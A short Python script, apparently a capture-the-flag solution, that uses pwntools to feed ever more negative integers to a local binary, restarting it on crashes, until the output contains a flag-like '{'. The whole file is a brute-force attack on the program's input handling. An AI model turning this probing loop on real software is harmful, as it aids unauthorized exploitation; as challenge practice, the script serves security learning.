from pwn import *

i = -1
found = False

while not found:
    p = process("./a.out")
    while True:
        try:
            p.sendline(str(i))
            resp = p.recvrepeat(timeout=0.10).decode('latin-1', errors="ignore")
            i-=1
        except:
            print("spawning another")
            p = process("./a.out")
            continue
        if '{' in resp:
            print("found!")
            print(i+1)
            exit(0)

    